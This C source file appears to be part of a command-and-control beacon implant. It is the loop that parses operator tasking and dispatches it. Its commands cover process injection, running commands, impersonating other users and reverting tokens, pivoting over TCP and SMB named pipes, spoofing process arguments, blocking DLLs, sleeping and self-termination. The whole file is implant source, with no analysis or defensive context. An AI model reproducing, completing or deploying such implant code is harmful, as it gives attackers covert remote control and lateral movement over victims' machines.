#include "pch.h"

#include "argument.h"
#include "beacon.h"
#include "command.h"
#include "filesystem.h"
#include "identity.h"
#include "link.h"
#include "self.h"
#include "spawn.h"

void TaskDispatch(int cmd, char* buffer, int size)
{
	switch (cmd)
	{
		case COMMAND_INJECT_PING:
			SpawnAndPing(buffer, size, TRUE);
			break;
		case COMMAND_INJECTX64_PING:
			SpawnAndPing(buffer, size, FALSE);
			break;
		case COMMAND_DIE:
			Die();
			break;
		case COMMAND_SLEEP:
			SleepSet(buffer, size);
			break;
		case COMMAND_CD:
			FilesystemCd(buffer, size);
			break;
		case COMMAND_BLOCKDLLS:
			BlockDlls(buffer, size);
			break;
		case COMMAND_TCP_CONNECT:
			LinkViaTcp(buffer, size);
			break;
		case COMMAND_PIPE_OPEN_EXPLICIT:
			ProtocolSmbOpenExplicit(buffer);
			break;
		case COMMAND_LOGINUSER:
			IdentityLoginUser(buffer, size);
			break;
		case COMMAND_PAUSE:
			Pause(buffer, size);
			break;
		case COMMAND_TOKEN_REV2SELF:
			BeaconRevertToken();
			break;
		case COMMAND_EXECUTE:
			Execute(buffer, size);
			break;
		case COMMAND_ARGUE_ADD:
			ArgumentAdd(buffer, size);
			break;
		case COMMAND_ARGUE_REMOVE:
			ArgumentRemove(buffer, size);
			break;
		case COMMAND_ARGUE_LIST:
			ArgumentList();
			break;
		case COMMAND_PWD:
			FilesystemPwd();
			break;
	}
}

void TaskProcess(char* buffer, int length)
{
	datap parser;
	BeaconDataParse(&parser, buffer, length);

	int remaining;
	do
	{
		int cmd = BeaconDataInt(&parser);
		int size = BeaconDataInt(&parser);
		char* data = BeaconDataPtr(&parser, size);

		remaining = BeaconDataLength(&parser);
		if (remaining < 0) // this should never happen
			return;

		TaskDispatch(cmd, data, size);
	} while (remaining > 0);

	BeaconDataZero(&parser);
}

